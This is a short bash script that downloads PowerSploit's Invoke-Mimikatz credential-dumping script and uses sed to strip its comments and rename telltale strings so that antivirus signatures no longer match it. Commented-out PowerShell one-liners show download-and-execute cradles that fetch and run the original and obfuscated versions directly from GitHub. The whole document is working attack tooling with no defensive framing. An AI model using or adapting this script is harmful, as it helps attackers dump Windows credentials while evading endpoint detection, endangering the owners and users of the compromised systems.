#!/bin/bash

# windows original
#powershell "IEX (New-Object Net.WebClient).DownloadString ('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz" 

# windows obf
#powershell "IEX (New-Object Net.WebClient).DownloadString ('https://raw.githubusercontent.com/nshynkevich/mimikatz-obf/master/Invoke-Mimiraptorz.ps1');Invoke-Mimirratz" 



# bash
# original to obf

wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
mv Invoke-Mimikatz.ps1 Invoke-Mimiraptorz.ps1
sed -i -e 's/Invoke-Mimikatz/Invoke-Mimirratz/g' Invoke-Mimiraptorz.ps1
# sed 's|<#*|\n&|g;s|#>|&\n|g' Invoke-Mimiraptorz.ps1 | sed '/<#/,/#>//d'
sed -i -e '/<#/,/#>/c\' Invoke-Mimiraptorz.ps1
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimiraptorz.ps1
sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimiraptorz.ps1
sed -i -e 's/DumpCerts/DumpCert/g' Invoke-Mimiraptorz.ps1
sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimiraptorz.ps1
sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimiraptorz.ps1
sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimiraptorz.ps1